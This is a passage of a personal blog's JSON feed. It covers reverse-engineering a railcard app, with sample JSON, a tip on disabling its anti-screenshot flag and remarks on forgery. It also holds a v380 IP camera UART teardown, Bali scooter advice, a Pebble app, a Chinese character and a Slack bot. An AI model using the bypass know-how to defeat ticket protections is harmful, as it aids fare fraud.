property\">\"cardholder_surname\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Engine\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"cardholder_title\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Mr\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"cardholder_type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Primary\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_barcode\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"05XTNVW5BYQ 2ABCDEFGHIJKLMNOPQRSTUVWXYZAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"b16b00b5-ffff-ffff-ffff-123456789abc\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_issued\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Online\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"TwentysixToThirty\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_number\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"05ABC0123456789\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_requested_date\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2019-01-19T11:11:11+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_transaction_reference\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"55555555555555555555555555555\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"TwentySixToThirty\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_valid_from\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2019-01-19T00:00:00+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"railcard_valid_to\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"3000-01-18T00:00:00+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"state\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Active\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token property\">\"token\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ABCDEF\"</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"http_status_code\"</span><span class=\"token operator\">:</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"message\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token property\">\"status\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"success\"</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/WqIKCi3ph_-767.avif 767w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/WqIKCi3ph_-767.webp 767w\"><img alt=\"Choo Choo Motherf****r\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/WqIKCi3ph_-767.png\" width=\"767\" height=\"1181\"></picture><figcaption>Choo Choo Motherf****r</figcaption></figure><p></p>\n<p>The National Rail logo in the bottom-right corner is the <code>SecurityFeatureView</code> which flips when you tap it, and changes colour to show it isn't just a screenshot (the anti-screenshot protection can be disabled by removing <code>FLAG_SECURE</code> in <code>android.view.window.setFlags(0x2000)</code>).\nWhile this railcard looks legit, there is nothing in the app describing the contents of the railcard barcode. This is the key security feature of the system. Depending on its purpose and contents, a forged railcard will be rejected by any inspector who scans the AZTEC (not QR) barcode. Since I don't know what data the barcode contains, I am <strong>unable</strong> to forge my own railcard without risking detection.</p>\n",
			"date_published": "2019-01-13T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/should-i-rent-a-scooter-in-bali/",
			"url": "https://blog.caller.xyz/should-i-rent-a-scooter-in-bali/",
			"title": "Should I rent a scooter in Bali?",
			"content_html": "<p><strong>Yes.</strong></p>\n<p>Two reasons:</p>\n<ul>\n<li>Not having a scooter in Bali sucks</li>\n<li>Having a scooter in Bali is fun</li>\n</ul>\n<p>Luckily, this is what you wanted to hear!</p>\n<h2 id=\"not-having-a-scooter-in-bali-sucks\" tabindex=\"-1\">Not having a scooter in Bali sucks <a class=\"header-anchor\" href=\"https://blog.caller.xyz/should-i-rent-a-scooter-in-bali/\">#</a></h2>\n<p>Walking down the streets, you're going to hear constant hooting from taxis touting for business.\nIf you don't have a scooter, you're going to be relying on taxis to transport you around as you realise walking in the heat was over-ambitious.\nThe taxi prices are of course much cheaper than your London black cab, but the experience is constantly frustrating.</p>\n<p>Each ride begins with bargaining the price which I find annoying.\nIt's certainly not in your favour if you want a fair local price.\nThen there is the confusion over the taxi companies. Blue Bird Group is supposedly the reputable taxi company in Bali with their blue taxis.\nHowever you also see purple-ish taxis blatantly driving around the tourist areas with the name &quot;Blue BIRO Group&quot; (not BIRD) to catch you out.</p>\n<p>There are taxi hailing apps. The first one I tried was the official Blue Bird Group app.\nIt works like Uber, and you can pay with the credit card linked with the app.\nThe app is buggy though. I tried to order a taxi to my hotel and four arrived, completely overwhelming the tiny hotel parking bay.\nThe security guard was trying to help my fifth taxi enter the car park when I explained what had happened.\nIt all worked out, and since the fare was metered and paid automatically by card there was no haggling or dodgy dealing.\nI did eventually dare try the app again, but it seems to only have cars in certain areas.</p>\n<p>Go-jek is an Indonesian everything-app like the Chinese WeChat. The original feature is hailing moto-taxis, who wear Go-jek branded clothing and helmets.\nSince topping up the wallet seemed complicated, I made a booking where I was supposed to pay the driver by cash. The price was cheap but I didn't actually ever get picked up.\nAfter a series of driver cancellations and what seemed to be a driver pretending he'd picked me up when he hadn't (possibly a bug) I decided it was probably for the best that I don't use a moto-taxi.\nThe one time I rode on the back of a motorbike in Bali was terrifying and I was in constant fear of my knees smashing into something.\nGrab also operates cars and moto-taxis in Bali and the quoted prices are super cheap even between cities. You see lots of anti-Grab and anti-Uber signs around.\nThe drivers turned up but they all renegotiated / begged the price up.</p>\n<p>It's not a great situation. On top of that, the roads can't really cope with the volume of cars. Your cab will be stuck in perpetual traffic jams while you see the scooters freely zooming around.</p>\n<h2 id=\"now-onto-the-fun\" tabindex=\"-1\">Now onto the fun <a class=\"header-anchor\" href=\"https://blog.caller.xyz/should-i-rent-a-scooter-in-bali/\">#</a></h2>\n<p>The situation finally wore me down so I gave in and rented a scooter on my final 2 days in Bali. It was a brilliant decision and <em>wish I'd dared to rent one earlier</em>.\nI rented from the first shop I came across near my hotel (not just some guy) in Sanur for 60,000 IDR / day. No insurance included.\nMy IDP and passport were scanned and I paid, but didn't leave any deposit. Make sure to take a helmet!\nI spent 15,000 IDR on half a tank of petrol. I probably did about 200km.\nSo total for 2 days was £7.</p>\n<h3 id=\"you-want-a-scooter\" tabindex=\"-1\">You want a scooter <a class=\"header-anchor\" href=\"https://blog.caller.xyz/should-i-rent-a-scooter-in-bali/\">#</a></h3>\n<p>Scooter = independent travel.\nComplete freedom to go where you want whenever you want without needing to haggle.\nOn longer trips you aren't just going from A to B, it's a journey.\nYou can stop anywhere to enjoy the beautiful scenery, take an ill-advised detour down an interesting looking track, take selfies, have a snack and chat at a friendly roadside warung.\nPay the local price. Since you're able to explore local shops away from touristland your adventurousness is rewarded handsomely in 5,000 IDR ice creams.\nThe big difference compared to a car is that with a scooter you're much freer to park anywhere on the roadside and to stop or U-turn in the road if you shoot past your turning.</p>\n<p>Try the road trip to <a href=\"https://goo.gl/maps/V7HuESrGHA17gpMaA\">Bukit Putung</a> recommended by Lonely Planet.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/XfzgRAd7Tw-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/XfzgRAd7Tw-1200.webp 1200w\"><img alt=\"You can stop at the roadside and take pictures like this!\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/XfzgRAd7Tw-1200.jpeg\" width=\"1200\" height=\"900\"></picture><figcaption>You can stop at the roadside and take pictures like this!</figcaption></figure><p></p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/0YxkJdhMSG-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/0YxkJdhMSG-1200.webp 1200w\"><img alt=\"Cool.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/0YxkJdhMSG-1200.jpeg\" width=\"1200\" height=\"900\"></picture><figcaption>Cool.</figcaption></figure><p></p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/gUsjZYc6Qm-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/gUsjZYc6Qm-1200.webp 1200w\"><img alt=\"Can just stop at this Warung for some non-touristy grub.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/gUsjZYc6Qm-1200.jpeg\" width=\"1200\" height=\"900\"></picture><figcaption>Can just stop at this Warung for some non-touristy grub.</figcaption></figure><p></p>\n<h2 id=\"tips\" tabindex=\"-1\">Tips <a class=\"header-anchor\" href=\"https://blog.caller.xyz/should-i-rent-a-scooter-in-bali/\">#</a></h2>\n<p>Knee-burn: Wear full-length trousers or put suncream on your knees since they'll be in direct sunglight. Don't get burned like me.\nOn the mountain roads e.g. towards Bukit Putung hoot your horn and don't cut corners at blind bends.\nWhen you park at a hotel or busy ice-cream shop there is usually a parking attendant. He might move the bikes around to make efficient use of parking space.\nRide carefully. Continue riding carefully even as you gain in confidence.\nIt seemed a little less safe than my previous scooter destination of Taiwan due to the lack of designated cycle / scooter lanes and slightly worse infrastructure.\nIt seems chaotic, but drivers are very aware of the omnipresence of scooters in Asia unlike places where they are rare.</p>\n<p><strong>Your travel insurance probably doesn't cover you unless you have a full motorcycle licence in your home country, so maybe disregard this post.</strong></p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/Pi13Cy3yZS-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/Pi13Cy3yZS-1200.webp 1200w\"><img alt=\"Why did the chicken cross the road?\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/Pi13Cy3yZS-1200.jpeg\" width=\"1200\" height=\"754\"></picture><figcaption>Why did the chicken cross the road?</figcaption></figure><p></p>\n",
			"date_published": "2018-10-09T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/avoiding-injection-with-taint-analysis/",
			"url": "https://blog.caller.xyz/avoiding-injection-with-taint-analysis/",
			"title": "Avoiding injection with taint analysis",
			"content_html": "<p>One simple way to improve the robustness of any code base is static analysis. It’s not widely used because it carries a (regrettably well-deserved) reputation for being a noisy, blunt instrument, but with small tweaks static analysis can become part of the common development process. In this post, I will explain how we use it to improve the security of our code.</p>\n<p><a href=\"https://smarketshq.com/avoiding-injection-with-taint-analysis-1e55429e207b\">Read the full blog post at Smarkets HQ</a></p>\n",
			"date_published": "2018-09-27T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/v380-ipcam-hardware-hackz/",
			"url": "https://blog.caller.xyz/v380-ipcam-hardware-hackz/",
			"title": "v380 IPcam: Hardware Hackz",
			"content_html": "<p>At SecTalks, blinken ran a Hardware Hacking 101 session where we investigated a Chinese IPcam &quot;WiFi Smart Net Camera&quot; v380.</p>\n<p>Some specs:</p>\n<ul>\n<li>720p video</li>\n<li>IR LED</li>\n<li>2-way intercom (talk to your pets)</li>\n<li>Pan / tilt (motor)</li>\n<li>Microsd card slot</li>\n<li>ONVIF, or use the gross &quot;V380&quot; app</li>\n<li>Either connects to an access point, or runs its own hotspot</li>\n<li>&quot;Smart&quot; motion detection</li>\n<li>Internet of shit cloud connecting to servers in China without TLS</li>\n<li>Anyka AK3918E system-on-chip</li>\n</ul>\n<p>It is sold by different manufacturers under different names, but, as of April 2020, is <a href=\"https://www.amazon.co.uk/gp/product/B079MCYDG2?tag=3l1t3-21\">on sale for £16.47</a>. The box has no manufacturer's name on it.\nLots of info on <a href=\"https://docs.google.com/presentation/d/1K0I1d0Ek5ODJp4QufWXswy6SngLz3r38ok0oN9lBNkg\">blinken's slides</a>.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/iKXbK3M1sH-1100.avif 1100w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/iKXbK3M1sH-1100.webp 1100w\"><img alt=\"Promo\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/iKXbK3M1sH-1100.jpeg\" width=\"1100\" height=\"1004\"></picture><figcaption>Promo</figcaption></figure><p></p>\n<h2 id=\"read-debug-logs-via-uart\" tabindex=\"-1\">Read debug logs via UART <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-hardware-hackz/\">#</a></h2>\n<p>Pull open the case (the side with the sdcard slot comes off) and expose the guts.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/9AQF8M78-m-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/9AQF8M78-m-1200.webp 1200w\"><img alt=\"Inside the camera, with USB-Serial cable attached to debug ports\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/9AQF8M78-m-1200.jpeg\" width=\"1200\" height=\"1239\"></picture><figcaption>Inside the camera, with USB-Serial cable attached to debug ports</figcaption></figure>\n‌<figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/WnvYO8Q3V8-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/WnvYO8Q3V8-1200.webp 1200w\"><img alt=\"Closer view of board\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/WnvYO8Q3V8-1200.jpeg\" width=\"1200\" height=\"1540\"></picture><figcaption>Closer view of board</figcaption></figure>\n‌<figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/7gwnT_pUya-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/7gwnT_pUya-1200.webp 1200w\"><img alt=\"Other side of board\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/7gwnT_pUya-1200.jpeg\" width=\"1200\" height=\"930\"></picture><figcaption>Other side of board</figcaption></figure><p></p>\n<p>A USB-to-serial cable can be attached to the exposed RS232 serial UART (RX, TX, GND). Connect to it using e.g. <code>sudo screen /dev/ttyUSB0 115200</code> and power on the camera.</p>\n<pre class=\"language-terminal\" tabindex=\"0\"><code class=\"language-terminal\">Cloud39E spiboot V1.1.01\nload spiflash bios ......\nasic clk:60000000, pre-scaler=1 (wanted 20Mhz, got 15Mhz)\nthe manufacture id is 001720c2\nspi param: id=001740ef, total_size=8388608, page_size=256, program_size=16.\nerase_size=4096, clock=25000000, flag=0, protect_mask=0.\nasic clk:60000000, pre-scaler=1 (wanted 25Mhz, got 15Mhz)\nfile cnt:4\nRead file BIOS\nstart:560\nfile len:2095880\nld addr:0x82008000\nLoad bios from spiflash successfuly!\nUncompressing Linux... done, booting the kernel.\nAnyka Linux Kernel Version: 2.1.06\nBooting Linux on physical CPU 0\nLinux version 3.4.35 (root@lin) (gcc version 4.4.1 (Sourcery G++ Lite 2009q3-67) ) #2 Fri Sep 1 15:13:49 CST 2017\nCPU: ARM926EJ-S [41069265] revision 5 (ARMv5TEJ), cr=00053177\nCPU: VIVT data cache, VIVT instruction cache\nMachine: Cloud39E_AK3918E+H42_V1.0.2\nMemory policy: ECC disabled, Data cache writeback\nANYKA CPU AK3916 (ID 0x20150200)\n\n...\n\nV380E login:</code></pre>\n<p>Lots of juicy info here, the ability to monitor what's going on as you interact with the camera, and the chance to login as root (I don't know the password yet though).</p>\n<h2 id=\"ports-v380-android-app\" tabindex=\"-1\">Ports, V380 Android app <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-hardware-hackz/\">#</a></h2>\n<p>Ports 5050, 5051, 8800 and 8899 are open according to <code>nmap</code>.</p>\n<p>Not sure what protocol the app uses to talk to the camera, but it all happens on port 8800. The app logic is mainly in native code, so reverse engineering will be annoying.</p>\n<p>One day I might play around a bit more.</p>\n",
			"date_published": "2018-02-22T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/pebble-bike-sharer/",
			"url": "https://blog.caller.xyz/pebble-bike-sharer/",
			"title": "Pebble Bike Sharer",
			"content_html": "<p>I like automated city bike rental services.\nMy new watch app for finding a bike within a city bike share scheme is <a href=\"https://apps.getpebble.com/en_US/application/5717f5d4c883965d2f000016\">available on the Pebble app store</a>.</p>\n<p>The data comes from <a href=\"https://github.com/eskerda/pybikes\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">pybikes</a> which includes over 400 bike sharing networks around the world\nand has an awesome free API http://citybik.es.\nI wanted an app that could direct me to the nearest available bike or available parking spot using the compass.\nIt uses GPS to find the nearest stations and you then use UP or DOWN to look for either nearby bikes or nearby parking spaces.\nThe main problems were:</p>\n<ol>\n<li>stations are often empty or full</li>\n<li>the data tend to be slightly inaccurate so if it says there are 2 bikes left, they have probably already been rented or are faulty</li>\n</ol>\n<p>The first station suggested is therefore the nearest station with more than 4 bikes or spaces.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/9lgNdApQou-144.avif 144w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/9lgNdApQou-144.webp 144w\"><img alt=\"App loading data\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/9lgNdApQou-144.png\" width=\"144\" height=\"168\"></picture><figcaption>App loading data</figcaption></figure>\n‌<figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/zo2FQoJs2o-144.avif 144w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/zo2FQoJs2o-144.webp 144w\"><img alt=\"Data loaded. Press UP or DOWN\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/zo2FQoJs2o-144.png\" width=\"144\" height=\"168\"></picture><figcaption>Data loaded. Press UP or DOWN</figcaption></figure>\n‌<figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/vSVqMY8ah6-144.avif 144w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/vSVqMY8ah6-144.webp 144w\"><img alt=\"Pebble screenshot]({attach}s1.png) ![App]({attach}s2.png) ![App\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/vSVqMY8ah6-144.png\" width=\"144\" height=\"168\"></picture><figcaption>Pebble screenshot]({attach}s1.png) <img src=\"https://blog.caller.xyz/pebble-bike-sharer/%7Battach%7Ds2.png\" alt=\"App\"> ![App</figcaption></figure><p></p>\n<p>As I said, I love the convenience promised by these services,\nbut some bike networks really need to get their act together with lugging bikes from the bottom of the hill to the top.\nIt seems really inefficient, but otherwise the service cannot be relied upon.\nNot finding a working bike is frustrating, but not being able to find a parking spot causes me immense stress.\nService operators really ought to maintain a certain guaranteed quality of service or else refund subscribers.</p>\n<h3 id=\"todo\" tabindex=\"-1\">TODO: <a class=\"header-anchor\" href=\"https://blog.caller.xyz/pebble-bike-sharer/\">#</a></h3>\n<ul>\n<li>[X] Animations</li>\n<li>[X] Refactor latitude / longitude code - see package <a href=\"https://github.com/bcaller/geodesy-spherical\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/geodesy-spherical</a></li>\n<li>[X] Cyrillic &amp; Chinese alphabets - see package <a href=\"https://github.com/bcaller/pebble_unicode\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/pebble_unicode</a></li>\n<li>[ ] Pausing of updates</li>\n</ul>\n<p>Source is at <a href=\"https://github.com/bcaller/pebble-bike-sharer\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/pebble-bike-sharer</a>.</p>\n",
			"date_published": "2016-04-20T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/chinese-character-of-the-day-chang/",
			"url": "https://blog.caller.xyz/chinese-character-of-the-day-chang/",
			"title": "Chinese character of the day 倀",
			"content_html": "<p>伥 <span class=\"pyin\"><span class=\"pyin1\">chāng</span></span> <span class=\"zyin\"><span class=\"zyin1\">ㄔㄤ</span></span> （倀）\n: the ghost of somebody devoured by a tiger, who urges the tiger to devour others\n: fantome d'une personne qui a été dévorée par un tigre, qui aide ensuite le tigre dévorer d'autres</p>\n<p>I accidentally came across this character while evaluating the KEY Chinese-French dictionary for Pleco (hence the French translation above).</p>\n<h2 id=\"origin\" tabindex=\"-1\">Origin <a class=\"header-anchor\" href=\"https://blog.caller.xyz/chinese-character-of-the-day-chang/\">#</a></h2>\n<p>It is most likely only used as 倀鬼 or 虎倀, and it's clear that this ghost has some sort of story behind it. There is a <span class=\"pyin\"><span class=\"pyin2\">chéng</span><span class=\"pyin3 pyineiv\">yǔ</span></span>:</p>\n<blockquote>\n<p>为虎作倀 （為--倀） <span class=\"pyin\"><span class=\"pyin4 pyineiv\">wèi</span><span class=\"pyin3 pyineiv\">hǔ</span><span class=\"pyin4 pyineiv\">zuò</span><span class=\"pyin1\">chāng</span></span> <span class=\"zyin\"><span class=\"zyin4\">ㄨㄟ`</span><span class=\"zyin3\">ㄏㄨˇ</span><span class=\"zyin4\">ㄗㄨㄛ`</span><span class=\"zyin1\">ㄔㄤ</span></span></p>\n</blockquote>\n<p>which is an idiom meaning to help a villian do evil, or to be an accomplice to an evildoer. I had assumed that it would imply some form of bitterness, with the dead guy wanting others to also get killed by the tiger. That is not actually part of the meaning and, in the story, helping the tiger was not the ghost's idea.</p>\n<p>http://www.youtube.com/watch?v=Vkmv_MfG4lc</p>\n<p>Anyway, using this word might get you a few blank looks, so try and forget it 😜.</p>\n<h2 id=\"related-words\" tabindex=\"-1\">Related words <a class=\"header-anchor\" href=\"https://blog.caller.xyz/chinese-character-of-the-day-chang/\">#</a></h2>\n<p>鬼 <span class=\"pyin\"><span class=\"pyin3 pyineiv\">guǐ</span></span> <span class=\"zyin\"><span class=\"zyin3\">ㄍㄨㄟˇ</span></span>\n: ghost 👻</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/Lsh_uIMFej-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/Lsh_uIMFej-1200.webp 1200w\"><img alt=\"我们家是**鬼屋**啊？ Our house is haunted? From Totoro (龙猫)\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/Lsh_uIMFej-1200.png\" width=\"1200\" height=\"646\"></picture><figcaption>我们家是<strong>鬼屋</strong>啊？ Our house is haunted? From Totoro (龙猫)</figcaption></figure><p></p>\n<p>虎 <span class=\"pyin\"><span class=\"pyin3 pyineiv\">hǔ</span></span> <span class=\"zyin\"><span class=\"zyin3\">ㄏㄨˇ</span></span>, 老虎 <span class=\"pyin\"><span class=\"pyin3 pyineiv\">lǎo</span><span class=\"pyin3 pyineiv\">hǔ</span></span> <span class=\"zyin\"><span class=\"zyin3\">ㄌㄠˇ</span><span class=\"zyin3\">ㄏㄨˇ</span></span>\n: tiger 🐯</p>\n<p>恶人 <span class=\"pyin\"><span class=\"pyin4 pyinbwv pyineiv\">è</span><span class=\"pyin2\">rén</span></span> <span class=\"zyin\"><span class=\"zyin4\">ㄜ`</span><span class=\"zyin2\">ㄖㄣˊ</span></span>\n: evildoer</p>\n<p>咬 <span class=\"pyin\"><span class=\"pyin3 pyineiv\">yǎo</span></span> <span class=\"zyin\"><span class=\"zyin3\">ㄧㄠˇ</span></span> （齩）\n: bite, snap at. In the story, we have 被老虎咬死的人 - the person bitten to death by the tiger\n: bark (dog)</p>\n",
			"date_published": "2016-02-15T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/slack-bingo-bot/",
			"url": "https://blog.caller.xyz/slack-bingo-bot/",
			"title": "Slack Bingo bot",
			"content_html": "<p>Companies love Slack, and lots of services integrate via their API. While slash commands are simple web hooks,\nbots can listen in to the conversations taking place on a channel and participate. Meet @bingo!\nAdd your buzzword to the list, and whoever mentions the word in the channel first will get the bingo.\nIt's a really simple unintelligent bot.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/zPL-6uRiBa-1163.avif 1163w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/zPL-6uRiBa-1163.webp 1163w\"><img alt=\"@bingo hello\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/zPL-6uRiBa-1163.png\" width=\"1163\" height=\"275\"></picture><figcaption>@bingo hello</figcaption></figure><p></p>\n<p>To add words to the list, private message @bingo e.g. 'add banana reload &quot;internet of things&quot;'. The user who adds the word is excluded from getting the bingo.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/yHjReysd3H-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/yHjReysd3H-1200.webp 1200w\"><img alt=\"It's stopped working! How do I **reload** the **internet of things**?\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/yHjReysd3H-1200.png\" width=\"1200\" height=\"917\"></picture><figcaption>It's stopped working! How do I <strong>reload</strong> the <strong>internet of things</strong>?</figcaption></figure><p></p>\n<p>The first time a keyword is used, @bingo will shout Bingo and show a GIF!</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/RaI_y3a0KQ-1030.avif 1030w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/RaI_y3a0KQ-1030.webp 1030w\"><img alt=\"Can I put a **selfie** in my **spreadsheet**?\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/RaI_y3a0KQ-1030.png\" width=\"1030\" height=\"943\"></picture><figcaption>Can I put a <strong>selfie</strong> in my <strong>spreadsheet</strong>?</figcaption></figure><p></p>\n<h1 id=\"installation\" tabindex=\"-1\">Installation <a class=\"header-anchor\" href=\"https://blog.caller.xyz/slack-bingo-bot/\">#</a></h1>\n<p>The source for bingo is available at <a href=\"https://github.com/bcaller/slack-bingo-bot\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/slack-bingo-bot</a>.</p>\n<h2 id=\"fa-slackslack-team-settings\" tabindex=\"-1\">:fa-slack:Slack Team Settings <a class=\"header-anchor\" href=\"https://blog.caller.xyz/slack-bingo-bot/\">#</a></h2>\n<p>Custom integrations &gt; Bots &gt; ... &gt; Get a token.</p>\n<h2 id=\"install\" tabindex=\"-1\">Install <a class=\"header-anchor\" href=\"https://blog.caller.xyz/slack-bingo-bot/\">#</a></h2>\n<p>Clone, install dependencies, set the <code>SLACK_TOKEN</code> environment variable and run <code>npm start</code></p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token function\">git</span> clone https://github.com/bcaller/slack-bingo-bot.git\n<span class=\"token builtin class-name\">cd</span> slack-bingo-bot`\n<span class=\"token function\">npm</span> <span class=\"token function\">install</span>\n<span class=\"token assign-left variable\">SLACK_TOKEN</span><span class=\"token operator\">=</span>xtokenX <span class=\"token function\">npm</span> start</code></pre>\n<p>A server is not really necessary: a WebSocket connection to Slack can be created from any computer.\nWhen not running, @bingo just will appear offline.</p>\n<p>You can change the starting words in initial.txt</p>\n<h2 id=\"in-the-channel\" tabindex=\"-1\">In the channel <a class=\"header-anchor\" href=\"https://blog.caller.xyz/slack-bingo-bot/\">#</a></h2>\n<p><code>/invite @bingo</code> invites the bingo bot.</p>\n<h1 id=\"code-make-a-fa-slackbot\" tabindex=\"-1\">Code: Make a :fa-slack:bot <a class=\"header-anchor\" href=\"https://blog.caller.xyz/slack-bingo-bot/\">#</a></h1>\n<p>We used the awesome botkit library. GIFs come from the giphy API. Uses arrow functions, <code>let</code> and template strings, so use an appropriate Node version.</p>\n<p>It's important to note that there are many events and API calls which are not explicitly documented in the\n<a href=\"https://github.com/howdyai/botkit\">botkit</a> README.\nHowever, the <a href=\"https://api.slack.com/methods\">Slack API calls</a> are available as <code>bot.api.x.y(data, cb)</code>: see <a href=\"https://github.com/bcaller/slack-bingo-bot/blob/5145b89ee1ca3e9b830ea816d4e8d8991be25945/react.js\">my use of 